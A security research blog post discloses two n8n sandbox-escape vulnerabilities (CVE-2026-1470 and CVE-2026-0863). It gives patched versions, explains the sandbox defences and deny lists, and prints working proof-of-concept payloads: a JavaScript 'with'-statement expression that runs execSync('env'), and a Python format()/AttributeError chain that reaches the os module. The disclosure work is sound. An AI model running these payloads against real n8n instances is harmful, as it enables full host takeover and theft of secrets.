<!DOCTYPE html>
<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
  <head>
    <title>Achieving Remote Code Execution on n8n Via Sandbox Escape - CVE-2026-1470 &amp; CVE-2026-0863 - JFrog Security Research</title><meta name="gridsome:hash" content="b938acc6380dca052a1890bac94a16244afdebca"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Achieving Remote Code Execution on n8n Via Sandbox Escape - CVE-2026-1470 &amp; CVE-2026-0863 | JFrog"><meta data-vue-tag="ssr" name="description" content="Our research team discovered and disclosed two vulnerabilities in n8n’s sandbox mechanism leading to remote code execution."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.ab306386.css" as="style"><link rel="preload" href="/assets/js/app.bf37fef3.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.d8806c3f.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.14687665.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.93e390cb.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.8af8d9bd.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.e19821e7.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.09b18c3f.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.70bb558a.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.d2ee2512.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.508f8bf9.js"><link rel="stylesheet" href="/assets/css/0.styles.ab306386.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());
      gtag("config", "GTM-T6MF8M");
      gtag('set', 'developer_id.dODQ2Mj', true);
    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
      Model Threats
    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3">
      Discover
    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
  Follow JFrog Security
  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
        Home
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
        Model Threats
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700">
        Discover
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
        Follow JFrog Security
      </a></li></ul></div></header><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Achieving Remote Code Execution on n8n Via Sandbox Escape - CVE-2026-1470 &amp; CVE-2026-0863</h1><p class="mt-1 mb-5 green">Nathan Nehorai, JFrog Security Researcher | January 27, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black"><p><img src="/img/RealTimePostImage/post/n8n-rce/image1.png"></p>
<p>The JFrog Security Research team recently discovered and disclosed two vulnerabilities in n8n’s sandbox mechanism: CVE-2026-1470, rated 9.9 Critical, impacting the expression evaluation engine, and CVE-2026-0863, rated 8.5 High, affecting Python execution in the Code node (“Internal” mode).<br>
<a href="https://github.com/n8n-io/n8n" target="_blank" rel="nofollow noopener noreferrer">n8n</a> is a popular AI workflow automation platform that combines AI capabilities with business process automation. </p>
<p>Following earlier vulnerability disclosures, n8n strengthened its JavaScript sandbox and, for the Python Code node, introduced a new “task-runner” option along with additional sandbox hardening measures. Despite these improvements, our research team was able to bypass these protections, demonstrating that even robust sandboxing mechanisms can be circumvented.</p>
<p>In both cases, exploitation resulted in remote code execution (RCE) by abusing gaps in the AST sanitization logic. Attackers that are able to create n8n workflows can exploit these vulnerabilities and easily achieve full remote code execution on the host running the n8n service. The vulnerabilities were applicable on n8n’s cloud platform and are still applicable on any self-hosted deployment of n8n which is running an unpatched version.</p>
<h2 id="who-is-vulnerable-to-cve-2026-1470--cve-2026-0863"><a href="#who-is-vulnerable-to-cve-2026-1470--cve-2026-0863" aria-hidden="true" tabindex="-1">Who is vulnerable to CVE-2026-1470 &#x26; CVE-2026-0863?</a></h2>
<p>CVE-2026-1470 - n8n users should upgrade to version 1.123.17, 2.4.5 or 2.5.1. Any earlier version is susceptible to CVE-2026-1470.</p>
<p>CVE-2026-0863 - n8n users should upgrade to version 1.123.14, 2.3.5, or 2.4.2. Any  earlier version is susceptible to CVE-2026-0863.</p>
<h2 id="cve-2026-1470---executing-javascript-inside-the-expression-engine"><a href="#cve-2026-1470---executing-javascript-inside-the-expression-engine" aria-hidden="true" tabindex="-1">CVE-2026-1470 - Executing JavaScript Inside the Expression Engine</a></h2>
<p><img src="/img/RealTimePostImage/post/n8n-rce/image2.png"></p>
<p>As described in the <a href="https://docs.n8n.io/code/expressions/" target="_blank" rel="nofollow noopener noreferrer">official n8n documentation</a>, an expression is: </p>
<p><img src="/img/RealTimePostImage/post/n8n-rce/image3.png"></p>
<p>So, how does this actually work? How come attackers can’t just execute arbitrary commands in the n8n host?</p>
<p>When the expression engine encounters a <code>{{ }}</code> block, it processes the enclosed content by passing it to a JavaScript <code>Function</code> constructor, which then executes the supplied code.</p>
<p>Because this execution model is inherently dangerous, n8n relies on an AST-based sandbox to validate that the JavaScript input is safe and cannot trigger unintended behavior, such as running arbitrary OS commands.</p>
<p>At the core of this sandboxing mechanism is <a href="https://github.com/n8n-io/tournament" target="_blank" rel="nofollow noopener noreferrer">n8n’s Tournament library</a>. The library parses the input into an Abstract Syntax Tree (AST) and hooks potentially dangerous nodes to neutralize them before execution.</p>
<p>The sanitization process begins by populating the execution environment with a modified global object:</p>
<pre><code class="language-ts">//packages/workflow/src/expression.ts
data.process = typeof process !== 'undefined'
    ? {
        arch: process.arch,
        env: process.env.N8N_BLOCK_ENV_ACCESS_IN_NODE !== 'false' ? {} : process.env,
        platform: process.platform,
        pid: process.pid,
        ppid: process.ppid,
        release: process.release,
        version: process.pid,
        versions: process.versions,
    }
: {};

Expression.initializeGlobalContext(data); //&#x3C;== This method will define most of the dangerous global objects, setters, getters, etc. into undefined or empty objects as can be seen here 
</code></pre>
<p>Followed by a static regex-based check to catch <code>.constructor</code> occurrences:</p>
<pre><code class="language-ts">//packages/workflow/src/expression.ts
const constructorValidation = new RegExp(/\.\s*constructor/gm);
        if (parameterValue.match(constructorValidation)) {
            throw new ExpressionError('Expression contains invalid constructor function call', {
                causeDetailed: 'Constructor override attempt is not allowed due to security concerns',
                runIndex,
                itemIndex,
            });
        }
</code></pre>
<p>Finally, the expression is passed through the Tournament hook validators. If all checks complete without errors, the expression is executed.</p>
<pre><code class="language-ts">//packages/workflow/src/expression-evaluator-proxy.ts
const errorHandler: ErrorHandler = () => {};
const tournamentEvaluator = new Tournament(errorHandler, undefined, undefined, {
    before: [ThisSanitizer],
    after: [PrototypeSanitizer, DollarSignValidator],
});
const evaluator: Evaluator = tournamentEvaluator.execute.bind(tournamentEvaluator);
export const setErrorHandler = (handler: ErrorHandler) => {
    tournamentEvaluator.errorHandler = handler;
};
export const evaluateExpression: Evaluator = (expr, data) => {
    return evaluator(expr, data);
};
</code></pre>
<p>During the Tournament evaluation process, three hooks are applied: <code>ThisSanitizer</code>, <code>PrototypeSanitizer</code>, and <code>DollarSignValidator</code>.</p>
<p>The <code>ThisSanitizer</code>, as the name suggests, mitigates attempts to escape via <code>this</code> by rewriting function invocations to use <code>.call()</code> or <code>.bind()</code>, binding execution to a sterilized global object:</p>
<pre><code class="language-ts">function() { return this.process; })() => transforms into => .call({ process: {} }, ...args)
</code></pre>
<p>This prevents access to the real global context through <code>this</code>.</p>
<p>The <code>PrototypeSanitizer</code> blocks prototype chain manipulation by denying access to properties such as <code>\_\_proto\_\_</code>, <code>prototype</code>, <code>constructor</code>, <code>getPrototypeOf</code>, and others commonly abused in sandbox escapes.</p>
<p>Finally, the <code>DollarSignValidator</code> restricts the use of the <code>$</code> identifier, which is reserved as the workflow data accessor.</p>
<p>In short, several validation layers are in place to mitigate well-known JavaScript sandbox escape vectors, including prototype pollution, global context access, reflection APIs, and constructor abuse.</p>
<p>However, one particularly problematic JavaScript feature was overlooked: the <code>with</code> statement.</p>
<p>This may have been ignored due to its deprecated status and the fact that it is strongly discouraged, as described <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with" target="_blank" rel="nofollow noopener noreferrer">here</a>:  </p>
<p><img src="/img/RealTimePostImage/post/n8n-rce/image4.png"></p>
<p>“<em>May be the source of confusing bugs</em>”?<br>
That sounds like exactly what we are looking for. Conveniently for us, the <code>with</code> statement is still supported by the Tournament AST parser.</p>
<p>The <code>with</code> statement effectively defines the scope for an expression, as described in the documentation:</p>
<pre><code class="language-ts">with (Math) {
  a = PI * r * r;
  x = r * cos(PI);
  y = r * sin(PI / 2);
}
</code></pre>
<p>There is no need to explicitly reference <code>Math</code> when calling <code>PI</code>, <code>cos</code>, or <code>sin</code>. The <code>with</code> statement defines the <code>Math</code> object as the scope for all expressions inside the block.</p>
<p>So how can this be abused to bypass the sandbox restrictions?</p>
<p>The current implementation blocks access to<code>constructor</code> when it appears as a <code>MemberExpression</code> node:</p>
<pre><code class="language-ts">obj.constructor                                                                                                                                                    
obj["constructor"]
</code></pre>
<p>However, when <code>constructor</code> is used as a standalone identifier, it is not blocked by either the AST validation or the static regex check, which only looks for <code>.constructor</code>:</p>
<pre><code class="language-ts">var constructor = 'gotcha';
// {{ (function(){ var constructor = 'gotcha'; })() }} &#x3C;= won't be blocked
</code></pre>
<p>This allows us to trick the AST checks by introducing a decoy <code>constructor</code> identifier inside a <code>with</code> statement and scoping it to <code>function (){}</code>, which effectively resolves to the <code>Function</code> object:</p>
<pre><code class="language-ts">{{ (function(){ var constructor = 'gotcha'; with(function(){}){ return constructor("return 1337")() } })() }}
//console: 1337
</code></pre>
<p>This expression is not blocked because, from the AST’s perspective, <code>constructor</code> is treated as a simple identifier. We can confirm this behavior by observing what happens when the decoy is removed:</p>
<pre><code class="language-ts">{{ (function(){ var not_a_constructor = 'gotcha'; with(function(){}){ return constructor("return 1337")() } })() }}
//console: Cannot access "constructor" due to security concerns
</code></pre>
<p>In other words, the AST believes <code>constructor</code> is a harmless identifier, while in reality it resolves to <code>Function.prototype.constructor</code> (where <code>Function.prototype.constructor \=== Function</code>). From that point, achieving arbitrary code execution becomes straightforward:</p>
<pre><code class="language-ts">{{ (function(){ var constructor = 'gotcha'; with(function(){}){ return constructor("return process.mainModule.require('child_process').execSync('env').toString().trim()")() } })() }}
//console: the main node's environment variables
</code></pre>
<p>This vulnerability received a critical rating, since the arbitrary code execution occurs in n8n’s main node, allowing authenticated attackers to completely take over an n8n instance.</p>
<h2 id="cve-2026-0863---erroring-our-way-out"><a href="#cve-2026-0863---erroring-our-way-out" aria-hidden="true" tabindex="-1">CVE-2026-0863 - Erroring Our Way Out</a></h2>
<p>The Python Code Node allows n8n users to execute arbitrary Python code for processing purposes, however - this code is also subjected to an AST sandbox, in order to protect the n8n instance from complete takeover while running under “Internal” configuration.  </p>
<p><img src="/img/RealTimePostImage/post/n8n-rce/image5.png"></p>
<p><img src="/img/RealTimePostImage/post/n8n-rce/image6.png"></p>
<p>This node can be executed under two different configurations. When the n8n instance is running in the recommended "External" configuration, Python execution takes place inside a separate Docker sidecar container rather than the main node. In this setup, an attacker would need an additional exploit to escape the sidecar and impact the underlying host.</p>
<p>However, if the n8n instance is running in the "Internal" configuration, Python code is executed as a subprocess on the main node itself, allowing a successful exploit to compromise the entire n8n instance.</p>
<p>In both configurations, Python code is executed under a restrictive AST-based sandbox defined by the <code>SecurityConfig</code> object. In its default configuration, the sandbox forbids importing both <code>stdlib</code> and all other external modules and denies access to a wide range of built-in functions, as shown below:</p>
<pre><code class="language-py"># packages/@n8n/task-runner-python/src/constants.py
BUILTINS_DENY_DEFAULT = "eval,exec,compile,open,input,breakpoint,getattr,object,type,vars,setattr,delattr,hasattr,dir,memoryview,__build_class__,globals,locals,license,help,credits,copyright"
</code></pre>
<p>User-supplied code is transformed into an AST, and each node is evaluated against the <code>SecurityConfig</code> policy, along with custom checks for dangerous node types such as <code>Import</code>, <code>Call</code>, and <code>Attribute</code>. The full implementation can be found <a href="https://github.com/n8n-io/n8n/blob/n8n%402.4.0/packages/%40n8n/task-runner-python/src/task_analyzer.py" target="_blank" rel="nofollow noopener noreferrer">here</a>.</p>
<p>At first glance, the default <code>SecurityConfig</code> appears extremely restrictive, leaving little room for meaningful interaction. Additionally, a modified global object is injected in place of the standard one:</p>
<pre><code class="language-css"># packages/@n8n/task-runner-python/src/task_executor.py

globals = {
"__builtins__": TaskExecutor._filter_builtins(security_config),
"_items": items,
"_query": query,
"print": TaskExecutor._create_custom_print(print_args),
}
exec(compiled_code, globals)
</code></pre>
<p>A common case with static AST-based sandboxes, Python’s formatting features can be leveraged to partially bypass restrictions and inspect internal objects, including the active <code>SecurityConfig</code> instance:</p>
<pre><code class="language-py">def gen_obj():
   yield 1

g = gen_obj()
next(g)

trick_ast='gi_frame.f_builtins[__import__].__closure__[1].cell_contents'
fmt = '{0.' + trick_ast + '}'
config = fmt.format(g)

return [{"json": {"config": config}}]

##this will leak the "SecurityConfig" object: #SecurityConfig(stdlib_allow=set(), external_allow=set(), builtins_deny={'__build_class__', 'hasattr', 'locals', 'input', 'type', 'open', 'credits', 'globals', 'compile', 'delattr', 'getattr', 'dir', 'object', 'license', 'vars', 'exec', 'memoryview', 'setattr', 'eval', 'help', 'breakpoint', 'copyright'}, runner_env_deny=True)
</code></pre>
<p>While this leakage is undesirable, <code>format()</code> alone only provides a string representation of objects and does not allow direct invocation. Normally, this limitation could be bypassed using <code>getattr</code>, but as shown above, <code>getattr</code> is explicitly forbidden by the policy.</p>
<p><strong>One of the fundamental weaknesses of AST-based sandboxes is their sensitivity to language evolution.</strong> High-level languages like Python frequently introduce subtle changes that can invalidate sandbox assumptions. Starting with Python 3.10, <a href="https://docs.python.org/3/library/exceptions.html#AttributeError" target="_blank" rel="nofollow noopener noreferrer">AttributeError exceptions gained the name and obj attributes</a>. This means that when we encounter an <code>AttributeError</code> exception we can call the object that was accessed for the named attribute!</p>
<p>For demonstration purposes:</p>
<pre><code class="language-py">def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj
        
class FrogSay():
     secret = "ribbit"

obj = FrogSay()
print(new_getattr(obj, "secret",Exception=Exception))
# this will print "ribbit" to console
</code></pre>
<p>By combining formatting-based access with <code>e.obj</code>, we can bridge the gap between a string-only representation and a fully callable object, without triggering the AST checks.</p>
<p>Using this technique, we can construct a complete RCE chain that escapes the sandbox entirely:</p>
<pre><code class="language-py">def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj

try:
    raise ValueError("pwn")
except Exception as e:
    tb = new_getattr(e, '__traceback__', Exception=Exception)
    frame = new_getattr(tb, 'tb_frame', Exception=Exception)
    builtins = new_getattr(frame, 'f_builtins', Exception=Exception)
    us = chr(95)
    imprt = builtins[us+us+'import'+us+us]
    import_globals = new_getattr(imprt, '__globals__', Exception=Exception)

    os = import_globals['os']
    os.uname()

# Will execute the uname system command
</code></pre>
<h2 id="conclusions"><a href="#conclusions" aria-hidden="true" tabindex="-1">Conclusions</a></h2>
<p>These vulnerabilities highlight how difficult it is to safely sandbox dynamic, high‑level languages such as JavaScript and Python. Even with multiple validation layers, deny lists, and AST‑based controls in place, subtle language features and runtime behaviors can be leveraged to bypass security assumptions.</p>
<p>In this case, deprecated or rarely used constructs, combined with interpreter changes and exception handling behavior, were enough to break out of otherwise restrictive sandboxes and achieve remote code execution. This reinforces the need for continuous reassessment of sandbox designs, careful alignment with specific runtime versions, and strong defense‑in‑depth strategies when executing untrusted code.</p>
<p>For platforms like n8n, which are frequently deployed in sensitive environments and handle privileged workflows, these issues underscore the importance of minimizing execution privileges and avoiding reliance on static validation alone.  </p>
</section><!----></div></div></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
              Terms of Use
            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
              Cookies Policy
            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
              Privacy Policy
            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
              Cookies Settings
            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
      ©2026 All Rights Reserved. JFrog Ltd.
    </p></div></footer></div>
